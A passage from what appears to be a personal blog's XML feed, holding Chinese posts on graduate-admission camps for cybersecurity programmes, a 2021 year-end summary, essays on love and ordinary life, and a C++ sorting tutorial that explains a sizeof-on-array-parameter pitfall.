左右出通知）</p><p>同专业另外的几个同学入营了，有排名前的也有排名后的，反正就是很迷惑。</p><p>然后过了好几天，从上交回校的时候，三室、五室、六室轮番打电话问要不要考虑（我猜是没招满，直接拿报名名单一个一个找（也真是辛苦）），上来就是“同学，那个你现在有 offer 吗”，笑死。</p><p>然后我当时说可以试一下（毕竟线上），然后他说给我报上了，注意邮箱。但是我等了好几天都没看见来信，我就把这事忘了，后来整理邮箱的时候，在垃圾箱里发现了信工所的材料提交邮件。。。看了一下好麻烦，要交不少东西，算了算了，估计当时给我发我也不会弄的。</p><p>国重是早早就满了，实力很强，竞争也很激烈。如果有志于读博，那我唯一推荐国重的老师。</p><h1 id="上交网安"><a href="#上交网安" class="headerlink" title="上交网安"></a>上交网安</h1><p>入营：100（学硕+专硕）<br>据不可靠消息，学硕只给了 10 个名额给外校的<br>最终结果：拿到专硕 offer<br>（同专业大佬拿到了学硕 offer，🍋）</p><h2 id="笔试"><a href="#笔试" class="headerlink" title="笔试"></a>笔试</h2><p>非常非常坑了。。。由于去年疫情的缘故，上交没有笔试，直接面试。所以当时上岸的学姐给我们透露的是，2019 年夏令营是英文选择题，基本上都是黑皮网安基础上的内容。</p><p>好家伙，我们就一直疯狂复习那本书（虽然刚学完）。</p><p>结果试卷发下来，傻眼了。</p><p>两部分，一部分网安基础，非常开放的题，比如 apt，蜜罐，银行业务，https 怎么保证安全。</p><p>第二部分网安数基，你猜怎么着，它认为的数学基础不是密码学群论和近世代数，而是概率论和线性代数！<br>考了极限中心定理、泊松分布和二次型，好家伙，一个都没复习。一首凉凉献上。</p><p>凭借着残存的记忆默写对了泊松分布的公式，中心定理直接胡答了，二次型直接手撕（最后也没撕出来）。<br>总之就是非常迷惑，说好的英语呢？说好的黑皮呢？说好的 ipsec 呢？</p><h2 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h2><p>群面，20 分钟，老师非常 nice。</p><p>面我的老师有谷大武院长，从头到尾只问了我的项目，一点专业课都没有问。</p><p>大都是表面问题，比如指标之类的，少部分考察项目思考的问题由谷大武老师提出，然后出来之后和小伙伴讨论的时候认为这次面试体验还不错。他们遇到的老师有的英语发音含含糊糊，听不清楚问的什么，有的老师怼了他好几个专业问题，总之感觉谷大武老师组非常和气，体验很好。</p><p>唯一一点要注意的就是，你英文自我介绍完之后，老师会用英语再提问你几个问题，虽然我都能听懂，但是表达还是比较磕绊（没提前准备）。</p><h2 id="推荐的科研团队"><a href="#推荐的科研团队" class="headerlink" title="推荐的科研团队"></a>推荐的科研团队</h2><p><strong>密码与计算机安全实验室(LoCCS)-谷大武</strong><br>实验室老师很多，我觉得实力很强，交大的 Ooop 战队应该就是他们组里的吧？<br>研究方向包括：</p><ul><li>密码学</li><li>软件安全</li><li>硬件安全</li><li>网络安全</li></ul><p><strong>密码分析与大数据安全实验室-邱卫东</strong><br>研究方向包括：</p><ul><li>密码分析/密码工程</li><li>图像视频多媒体智能化分析/自然场景文本处理技术</li><li>AI 安全与隐私保护</li><li>金融大数据分析</li><li>互联网测量技术</li></ul><p>老师较少，但方向不错。</p><h1 id="中科大网安"><a href="#中科大网安" class="headerlink" title="中科大网安"></a>中科大网安</h1><p>时间：7.20-23 线上<br>入营：90~100<br>结果：获得 offer，根据之后学校抄送的邮件来看，大概有 70 个左右的优营，可以说点击就送（bushi</p><p>中科大是最早发布夏令营信息的，大概 4 月？就一整个长跑，老拖着你反正。也是除了绿裙之外唯一一个公开夏令营交流群的大学，前期差不多每个群 2000+。</p><p>然后前期也在一直宣传，又是实验室开放日（线上），又是宣讲的，还邮寄了参营大礼包（印着 USTC 的小书包！超可爱，文化衫，本子笔），参与感满满，点赞。</p><p>然后就是线上面试，咋说呢，一言难尽。感觉虎头蛇尾的。<br>入营很难，然后优营水水就能拿。面试上午一次，下午一次，不同的老师，唯一不同就是上午要英文自我介绍。然后提的问题也挺简单的（虽然同住的小伙伴被问到的问题有点离谱，反正很开放，老师看你运用知识的能力）<br>最迷惑的是，发了这么多优营，结果联系所有老师都说满了，非常离谱，一度让我产生没有学上了的错觉，然后我就放弃继续联系导师了。</p><p>然后就开始九推准备了（这期间上交和中科大结果都没出来）</p><p>8 月 13 号？上交突然发来邮件说我拿到优营了，贼开心反正，因为我进当时她发的一个会议链接（里面都是优营），大概就 40 人，估计 20 学硕 20 专硕。</p><p>然后过了几天，中科大我导给我发邮件，说研究方向很合适现在有名额要不要来，我当时被上交优营的喜悦冲昏了头脑，就直接没回。</p><p>后来，经过谨慎的思考，我觉得还是学硕比较适合我，（几天后）我联系我导，他说他名额满了，但可以给我推荐，然后推荐到实验室大老板那了，面了一个小时收了。</p><p><strong>至此，夏令营结束。</strong></p><h1 id="哈深-CS"><a href="#哈深-CS" class="headerlink" title="哈深 CS"></a>哈深 CS</h1><p>哈深也是分好几批，从 8.20 开始一直到 9.3<br>线上</p><p>我联系的挺早，那个老师也加我微信电话聊了聊，然后我就投了等待入营。<br>结果？四批入营始终也没收到入营邮件，离了个大谱，rank2 没入营，基友也没入营，搞不懂哈深怎么个筛选机制。</p><p>总之来说，建议去知乎上多搜搜，哈深不做太多评价。</p><h1 id="浙大网安"><a href="#浙大网安" class="headerlink" title="浙大网安"></a>浙大网安</h1><p>浙大属于出结果很晚的，大概 9.20？那个时候我已经答应了中科大，所以就放弃了。</p><p>就是极限面试出结果。</p><p>浙大网安是没有机试的。</p><p>前人经验：分为英文环节和中文环节，英文环节主要是红白纸，但也有人遇到英文自我介绍，甚至英文介绍项目经验。中文环节会根据你的简历和成绩单发问，还可能问数学以及 408 的一些问题。跨专业的注意是否学过与计算机有关的课（如信号与系统），这些很有可能问。一般来说学院面试只要不是一问三不知最后都能混个平均分上下。（应该是 cs）</p><h1 id="北航网安"><a href="#北航网安" class="headerlink" title="北航网安"></a>北航网安</h1><p>北航依旧是极限九推，和浙大差不多的时间，9.15 号发通知，然后入营面试。我们院入营的蛮多，可以说在入营这方面不卡 211，主要看个人表现。<br>中英面试，之前线下有机试，线上貌似取消了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>前五学期的成绩非常重要！！！务必保证排名好看！！！</p><p>在保证排名的前提下，适当参加科研项目/比赛，我的话因为都是第一负责人，所以简历也写的好看一些。</p><p>因为现在的趋势就是越来越卷，还是建议手握一篇 paper（不要水刊，会减分）。</p><p>然后就是夏令营入营还是很激烈的，但是没入营也不要放弃，就今年的情况来看，鸽子还是很多的，比如 sju 穿了（候补都候补到学硕）、中科大也鸽了挺多、华科穿没穿不清楚、天大智算也穿了，具体情况上知乎上搜一搜就知道了，依旧是鸽子满天飞，要果断抓住机会。</p><p>九推相对就容易得多，身边夏令营 0 offer 的也能拿 top 的（不过注意，上交没有九推，北航只有九推，浙大也只有九推），所以放轻松，不到最后别放弃。</p><p>最后祝大家都能收获满意的推免结果~</p>]]></content>
      
      
      <categories>
          
          <category> 经验贴 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 保研 </tag>
            
            <tag> 经验贴 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-Year-end-Summary</title>
      <link href="/2021/2021-Year-end-Summary/"/>
      <url>/2021/2021-Year-end-Summary/</url>
      
        <content type="html"><![CDATA[<p>今天是 12 月 13 日午后，西安的阳光很好，我坐在宿舍，写下今年的年终总结。</p><a id="more"></a><h1 id="时光"><a href="#时光" class="headerlink" title="时光"></a>时光</h1><p>这一年过得飞快，年初的时候就是大三下了，同时准备着课程和作品赛，忙的飞起。虽然作品赛没拿奖，不过这确实是一段很宝贵的，面向区块链方向的科研经历。 回顾一下这一年都干了啥，</p><p>二月：和基友约着玩+过年</p><p>三月：开学，作品赛</p><p>四月：第一次面试，西交面基。老师和我聊了一个多小时，全程压力面，是我对于保研面试的初印象。<br>五月：作品赛、白流量系统收尾，几个夏令营的材料准备和报名投递<br>六月：期末考试，西交夏令营试水，体验非常一般，不发 offer</p><p>七月：全力准备保研面试，上科线下最早试水（体验不错，准备不足），山大线上（流程简单，拿到 offer，比例大概 30%），上交（线下，不包食宿，考试+面试，拿到 offer，比例大概 45%)，中科大（和上交撞了，但是线上，因此参加，流程较水，拿到 offer，比例大概 70%），武大线下（放弃），复旦未入营（maybe 我没有报，忘记了），南大 cs 初筛未过。</p><p>八月：前半程水了几天，然后全力准备预推免（连家都没回），顺便投了阿里，拿到一个飞猪安全的秋招 offer。</p><p>九月：报名哈深，联系一位老师，打电话聊了聊，然后一直没入营，估计卡 211。然后前六学期的成绩出来了，还是没有前进，故放弃北大深圳的申请。浙大网安入营，但是通知的比较晚，我已经答应了中科大的老师，由于我导师去年被我学长报系统那天鸽了，因此我最终没有参加浙大考核（那几天舍友保研搞得心态比较浮躁，然后不想再鸽老师了，担心会给学弟学妹造成影响），因此预推免遗憾收场，假期努力白费。</p><p>十月：特奖 get，国奖 get，似乎没有干什么其他事情<br>十一月：备战国考，还去当了几天志愿者</p><p>一年到头，匆匆而过。</p><p>这一年，认识了不少新朋友，也重拾了几位旧时好友。</p><p>这一年，发生了不少大事。袁老千古，建党百年，东京奥运，河南暴雨，天宫空间站建成，人工合成淀粉。</p><p>这一年，乏善可陈。</p><h1 id="成长"><a href="#成长" class="headerlink" title="成长"></a>成长</h1><p>这一年，又遇到了面临着人生重大选择的时刻——研究生的去向。我像是三年前的那个少年，依旧选择了本心的那个决定。为什么选择科大而放弃了上交？其实我的考虑很简单，专硕学费高，可塑性小，同是华五，其实城市位置不是那么重要，毕竟只是一个平台。当然，我的朋友最后选择去了上交，也是很不错的选择，毕竟人家是学硕。</p><p>我后悔吗？目前来说不后悔。我认为我的研究生阶段就是潜下心做学问的三年，和本科的前三年一样，清苦、修行。我知道，科大是一个比西电男女比例还恐怖的地方，在和尚庙里找女朋友基本就是不要想了，所以就慢慢向前走吧，或许会遇到，或许不会，一切皆是缘。</p><p>这一年，我对“何为人”这个命题有了新的认识。在之前，我对于做一个什么样的人这个概念还是比较模糊的，为何人，何为人，是一个深刻的问题。在阅读了许多回答、看了许多故事、遇见许多人、听过许多道理之后，我似乎在慢慢的知天命。</p><p>知何可为，何不可为。知何为重，何为轻。知白守黑，和光同尘。</p><p>规划人生，分清主次。于我，家人是最重要的，其他什么都无所谓。朋友，聚少离多，多年好友寥寥。爱情，克制而清醒，愿予真心，难觅良人。</p><h1 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h1><p>专注当下，未来我希望能继续修炼，静心养性。</p><p>去明白自己在哪个圈子，已经有什么，能追求什么，会得到什么，然后可以找到一起完成这些事情的人。</p><blockquote><p>要容忍心里难解的疑惑，试着去喜爱困扰你的问题。重要的是，你必须活在每一件事情里。现在你要经历充满难题的生活，也许有一天，不知不觉，你将渐渐活出写满答案的人生。</p></blockquote><p>新的一年，我们继续在成长的路上奋力前行。希望我们走在一条开满桃花的路上，云蒸霞蔚，前途似锦。</p><p><img src="https://image.hackerjerry.top/topImg-8.jpg#height=370&id=NVjWP&originHeight=916&originWidth=690&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title=&width=279"></p>]]></content>
      
      
      <categories>
          
          <category> 年终总结 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>What is the difference between Friendship and Love?</title>
      <link href="/2021/What%20is%20the%20difference%20between%20Friendship%20and%20Love/"/>
      <url>/2021/What%20is%20the%20difference%20between%20Friendship%20and%20Love/</url>
      
        <content type="html"><![CDATA[<p>那夜我看到了你的忧虑与顾忌，我虽察觉到你的问题所在，但忍住没说，因为这是一个值得慎重考虑的话题，我希望能更慎重地给你建议，所以采用了文字的方式来回应你，可能你不能一下子理解我在说什么，但文字的好处就在于它能被留下，这些道理现在你不懂没关系，记住它，总有一天用得上。</p><p><strong>（一）你不必感到羞愧，因为那不是爱情</strong><br>你和我说你现在同时在接触好几个女生，总有一种罪恶感，搞得自己好像很花心。</p><p>我问你你和那些女生都聊些什么？你告诉我只是聊她们和你的交集，骑车、话剧、动漫、音乐、哲学。。。<br>她们总有一个闪光点让你想要靠近。</p><p>我又问你那还拓展出来聊别的不？你和我说：不会，怕浪费时间，有些东西估计和她们聊她们估计也不懂，我只和她们聊她们懂的东西。</p><p>你看，你觉得聊聊大家都感兴趣的东西就挺好，也没想着进一步发展，动机这么纯，怎么是爱情？</p><p>其他男生都是靠共同话题打开其他话题，然后进入到情感话题把对方攻陷了，他们就是带着这种把女生把到手的目的去和女生聊天的。</p><p>人家那叫谈恋爱，你这叫谈兴趣。</p><p>和别人聊聊兴趣爱好，这和 ta 的性别有关系吗？难道你和男同学聊 Dota 就是为了和他们搅基吗？我想不是吧。</p><p>多几个朋友聊天，哪怕是女生，又有什么关系。</p><p>你只是想把自己关于这个兴趣上感受到的快乐分享给更多人，你何必感到羞愧呢？<br><strong>（二）有些事，能完成它的并不只有爱情</strong><br>你和我说，有时候真希望能找一个女生，倾吐所有自己对这个世界的困惑和社会的忧愁。</p><p>我问你为什么不和我说，不和其他的朋友说。</p><p>你告诉我：“这些事情太沉重，不希望你们担心”。</p><p>你为何要这么善良，善良到只愿与我们分享你的快乐，却把悲伤全留给自己。</p><p>我见过你为了友谊舍付出了那么多，为何你不愿别人在你伤痛的时候也帮帮你？</p><p>你总说你自己能解决，需要的是一些反思的时间。</p><p>你那么自私，自私到不愿分我们一丁点痛苦。</p><p>你觉得爱情是自私的，所以允许你自私一点，去诉说那些困扰了你很久的心事。</p><p>你都不愿我们去承受那些伤痛，你怎么忍心让一个爱你的女孩去承受这些？</p><p>爱是为了甜蜜，不是为了苦涩。</p><p>同甘共苦，并不是仅仅只有爱情能做到，友情也能！</p><p>我就在这里，我可以愿意听你述说你内心的忧愁，哪怕我不能帮你解决它，说出来总也能减轻一些压力。<br><strong>（三）我所理解的爱情</strong><br>你不是也读过《爱的艺术》么？爱是积极关心和帮助对方成长。</p><p>但现在有多少情侣，打情骂俏、总想着出去看电影、吃饭，有事没事都腻在一起，不断压缩着独处的时间，压缩着自我成长的时间。</p><p>等他们腻了，倦了，分了。剩下什么？用最宝贵的青春去交换所谓的甜蜜回忆，可再甜蜜也抵不过现实的残酷啊！</p><p>我只希望他们多年后不要咒骂，咒骂对方在自己最该努力的时间，让自己沉迷于甜蜜而忘了去努力。</p><p>当然我身边也有些好例子，他们在一起做得最多的事情就是一起自习。有的男生本来不怎么爱学习，可在女朋友的督促下也常常去自习室。有的女生本来不爱运动，在男朋友的带动下也经常去夜跑。他们从未要求对方要带自己去外面吃饭、看电影，只是晚饭后牵着对方的手，在启真湖畔散散步，聊聊天。没话聊了就回自习室自习。<br>谈这么一场“无聊”的恋爱，不也挺好的么？</p><p>你肯定要喷我一点激情也没有，但谁说爱一定要炽热？</p><p>爱情不是沸腾你体内的多巴胺，虽然你曾和我说一年前那种心跳不止的心情，可又能持续多久呢？你不怕得心脏病？</p><p>别整天幻想着那些无聊青春剧的情节了，真正的爱情一定平淡无奇，但那份平淡里所蕴含的力量，不是那些炽热而短暂的烈火能比的。</p><p>记住：你不是为了去寻找刺激而去恋爱，而是为了给心找一个归宿。让躁动的心平静下来。</p><p>你是一个聪明但急躁的人，急躁的人做不成大事。</p><p>愿你能找到一个包容又智慧的姑娘，静静你那躁动的心。让你能好好沉淀，慢一些，反而会成功得快一些。<br><strong>（四）爱情是互补，友情是共鸣</strong><br>你肯定想问我，那要怎么去找一份真爱，我知道你对自己有一定的了解，那就去找那个与自己互补的人。</p><p>我并不是说你要去找一个和你观点不同的人，整天争来争去补充自己的观点。</p><p>相反，互补需要两个人的核心价值观相同，且明白自己的优势与弱势，用自己的优势去弥补对方的劣势，用对方<br>的优势弥补自己的劣势。</p><p>这样的两个人不会争吵，因为他们不在乎生活里的小摩擦。而且更相信对方，因为他们知道在共同面对一个困难<br>时，该听谁的主意。</p><p>有人说爱是包容对方所有的缺点，我想有一定道理，但不完全正确，我觉得应该改成爱是接受对方所有的缺点，并努力帮 ta 改掉这些缺点。</p><p>因为包容解决不了问题，你可能不会爱 ta 一辈子，你所能做的只是帮助 ta，帮助 ta 变得更独立，变得越来越不需要依赖你。</p><p>或许多年后 ta 身边站着的不是你，但我相信 ta 在心里一直感谢你。</p><p>有时候你遇到一个她，她似乎就是一个另一个性别的你，她喜欢你所有喜欢的东西，她理解你的一切，和她在一起你是那么的开心。</p><p>那种开心冲昏了你的头脑，让你误认为那是爱情。<br>有好多人就是这样走在了一起。</p><p>可两个兴趣点完全相同的人如果腻在一起，总有一天会无聊的，因为他们知道对方在想什么，他们需要一些新意。</p><p>这种感情应该成为友情，你不要奢望对方给你的太多，在一起时能产生共鸣的快乐，就够了，别那么自私地想占有对方的全部。</p><p>我不反对你以后心里装着好几个女性朋友，但你以后心里一定只能有一个女朋友，别错把友情当爱情。</p><p><strong>（五）是男人就要耐得住寂寞</strong><br>你现在虽然单身，但千万不要因为寂寞而去找另一半，不断丰富自己，不断认识自己，总有一天你会遇到与你互补的她。</p><p>而且你有着那么多可以做的事情，你对那么多东西感兴趣，你又喜欢书写自己的故事。</p><p>那就好好去感受吧，生活就是你最好的素材，在生命中感受最敏感的时刻好好去感受这个世界，然后用你的文字留住自己的经历和感受。</p><p>虽然写作时我们常常是寂寞的，但如果耐不住这份寂寞，多年后我们又怎么能回味到这文字里的那些酸甜苦辣。<br>耐得住寂寞的人才能等得到真爱。</p><p>祝早日找到适合你的她。</p>]]></content>
      
      
      <categories>
          
          <category> 知乎 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一个平凡人的自述</title>
      <link href="/2021/%E4%B8%80%E4%B8%AA%E5%B9%B3%E5%87%A1%E4%BA%BA%E7%9A%84%E8%87%AA%E8%BF%B0/"/>
      <url>/2021/%E4%B8%80%E4%B8%AA%E5%B9%B3%E5%87%A1%E4%BA%BA%E7%9A%84%E8%87%AA%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>一个平凡人，活着的意义是什么呢？</strong></p><p>我没有很好的外表，也没有可以挥霍的资本，从小到大一直都普普通通。</p><p>在人前一般都很安静，给人看起来不善言谈的样子。个人很独立，自己的事情尽量自己完成。从不主动去和异性搭话或是帮忙，也很少去表现自己，在人群中永远都是小透明。</p><p>消息总是群聊、公众号发来的信息，时常觉得是自己做的不够好，长得不好看。内心很敏感，有时别人一句无心的话，可能会使自己郁闷一整天。</p><p>和别人说话总是很温柔，难过的事情自己扛，不太希望别人干扰我的生活，听歌听一晚、睡起来还是新的一天。在灯火通明的夜里，无聊的看星星和月亮落下，每天都是循环如此。</p><p>每当有人问起，为什么我不恋爱的时候，我总以麻烦为理由搪塞过去。</p><p>朋友和我说，或许是你还没遇见真正喜欢的人吧，我却没法开口告诉他们。其实我遇见过，只是遇见得过早，以至于我还没来得及弄清楚，就弄丢了。</p><p>在二十多年的平淡日子里，既没能成为自己的月亮，又一事无成，惊艳不了谁的岁月。</p><p>那么平凡的我，活着的意义是什么？</p><p>日你妈，我偏爱自己骨子里的那份冷清，生性安静，但也孤傲，遵从自己的内心。</p><p>我脚下的影子从来不肯试着像谁，直抒胸臆我也不曾受谁气受。</p><p><strong>我对美好生活的向往，就是我活着的意义。</strong></p><p>我想努努力，赚点小钱，然后实现经济独立，去做些自己想做的事。</p><p>去爬一次雪山，去感受千山鸟飞绝，万径人踪灭。去感受自然的伟大和雄伟瑰丽，去挑战自我。</p><p>去草原骑一次大马，看野花被风吹起，牛羊奔息，草原就像是落了一场急雨。草叶翻滚，踩上去就会有咯吱咯吱的淅沥与轻柔。</p><p>去边远的乡村旅行。傍晚的风很轻，天空挂着洁白的云，在小镇古朴的石桥上，牵着大狗儿慢悠悠地走在落日的大道。</p><p>我还想去写故乡的月亮，弥补对家人的亏欠，为自己不懂事的过往道歉，原谅自己人生的缺憾。</p><p>那时的天空很蓝很近，晚霞晕染在天边，村庄散出一圈又一圈的白烟。我和女孩站在长满栗子的老树下，轻轻地敲打着秋天。</p><p>我现在想去遇见能分享心情的人。看月光淡淡地爬上树梢，抓住平淡日子里的小确幸，在心里种下一株向阳而生的花儿，比一切美酒都要芬芳。</p><p>有人问一个平庸的人，活着的意义是什么？其实无论多么波澜壮阔的生命，最终都要归于平淡的柴米油盐与尘土，我感谢自己卑微而鲜活地活着。</p><p>有人说活着很累，其实吧，我也没吃过什么生活的苦。此生有幸，受家人疼爱，朋友照顾，而我不快乐的原因多数只是自己放大了，一些人生中的小挫折失败罢了。</p><p>生活中总会有很多平常的快乐可以沉溺其中。比如每天吃到的好吃东西，与朋友分享的有趣片段；洗完了积攒许久的衣服，收获来自陌生人的夸赞与关心；在温柔的日落下，去小区楼下喂养流浪的小猫，任其在怀里撒泼打滚。</p><p>生活本就由零散的碎片组成，有时鸡飞狗跳，有时轻松欢愉。如果愿意用最细腻的情感，去体验那些包裹在烟火里的平凡琐碎，就会从中收获到新的柔软与感动。如果感到不快乐的时候，可能只是我们把重心放错了地方，不必在一件事上停留太久。</p><p><strong>生活原本苦闷，但跑起来就会生风。</strong></p><blockquote><p>这是知乎答主<a href="https://www.zhihu.com/people/you-nei-han-de-shi-ni-yao-a">吹面不寒</a>的一篇回答，我很喜欢，这世界有很多相似的人，虽然成长的环境各不相同，但却塑造成了相似的人，我从他的回答里看到了自己的影子，可以说世另我！<br>所以说，像我们这样平凡的人，既然并不出色，那么就把手里的事情做好，就够了。既然成为不了别人的月亮，也温柔不了别人的时光，那么就好好的爱自己，好好的爱家人，对朋友也真心付出，好好的健身，去提升自己，无论内在或者外在。<br>追逐日月，不苟于山川。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知乎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序</title>
      <link href="/2021/%E6%8E%92%E5%BA%8F/"/>
      <url>/2021/%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>把各类排序做一遍梳理。</p><a id="more"></a><h1 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//bubble sort</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num[])</span></span>&#123;<br>    <span class="hljs-keyword">int</span> length = <span class="hljs-keyword">sizeof</span>(num)/<span class="hljs-keyword">sizeof</span>(num[<span class="hljs-number">0</span>]);<span class="hljs-comment">//获取数组长度</span><br>    <span class="hljs-keyword">int</span> temp;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i  = <span class="hljs-number">0</span>;i &lt; length<span class="hljs-number">-1</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j&lt; length<span class="hljs-number">-1</span>-i; j++)&#123;<span class="hljs-comment">//注意这里，每一轮j比前一轮到达的位置递减</span><br>            <span class="hljs-keyword">if</span>(num[j] &gt; num[j+<span class="hljs-number">1</span>])&#123;<br>                temp = num[j];<br>                num[j] = num[j+<span class="hljs-number">1</span>];<br>                num[j+<span class="hljs-number">1</span>] = temp;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>双层循环，时间复杂度是 O(n2)。</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p><strong>比如说给你一个有序的数组，或者是部分有序的数组，你怎么把它的运行时间降下来</strong><br>我们可以设置一个标记位，如果在某一轮中从来没有交换过前后两个数，我们认为此时就已经有序了，没必要再进行之后的循环了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> length = <span class="hljs-keyword">sizeof</span>(num)/<span class="hljs-keyword">sizeof</span>(num[<span class="hljs-number">0</span>]);<span class="hljs-comment">//注意，计算数组长度必须要在main函数里面，而不能将num做参数传递之后再计算。</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">OptimizeSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num[],<span class="hljs-keyword">int</span> length)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> temp;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length - <span class="hljs-number">1</span> ; i++)&#123;<br>        <span class="hljs-keyword">bool</span> flag = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; length - <span class="hljs-number">1</span> -i; j++)&#123;<br>            <span class="hljs-keyword">if</span>(num[j] &gt; num[j+<span class="hljs-number">1</span>])&#123;<br>                temp = num[j];<br>                num[j] = num[j+<span class="hljs-number">1</span>];<br>                num[j+<span class="hljs-number">1</span>] = temp;<br>                flag = <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>          <span class="hljs-keyword">if</span>(flag)&#123;<span class="hljs-comment">//经过一轮后，flag标志没有改变，说明有序，可以退出循环</span><br>              <span class="hljs-keyword">break</span>;<br>          &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当将数组作为实参传递到另一个函数中时, 另一个函数的形参相当于一个指针变量, 因为将数组的名作为实参时, 就是<strong>将数字的首地址作为实参</strong>, 所以在 test 函数中输出的<strong>sizeof(arr)其实得到的是一个整型数组指针的长度</strong>(所占的字节数), 所以结果是 8, 再用其除以 int 所占的字节数(4), 结果就是 2。ps：这里 sizeof(&amp;arr)=8，sizeof(arr)=实际长度*4<br>要想用函数计算数组的长度，可以使用函数模板。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">count</span><span class="hljs-params">(T&amp; x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> s1 = <span class="hljs-keyword">sizeof</span>(x);<br>    <span class="hljs-keyword">int</span> s2 = <span class="hljs-keyword">sizeof</span>(x[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">int</span> result = s1 / s2;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a[] = &#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> &#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; count(a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>为什么可以呢？首先我们需要知道函数模板是什么。</p><h3 id="函数模板"><a href="#函数模板" class="headerlink" title="函数模板"></a>函数模板</h3><p><strong>函数模板不是一个实在的函数，编译器不能为其生成可执行代码。定义函数模板后只是一个对函数功能框架的描述，当它具体执行时，将根据传递的实际参数决定其功能。</strong><br>C++ 语言支持模板。有了模板，可以只写一个 Swap 模板，编译器会根据 Swap 模板自动生成多个 Sawp 函数，用以交换不同类型变量的值。<br>函数模板的写法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> 类型参数1, <span class="hljs-title">class</span>类型参数2, ...&gt;</span><br><span class="hljs-class">返回值类型  模板名(形参表)</span><br><span class="hljs-class">&#123;</span><br>    函数体<br>&#125;<br></code></pre></td></tr></table></figure><p>具体示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">Swap</span>(<span class="hljs-title">T</span> &amp; <span 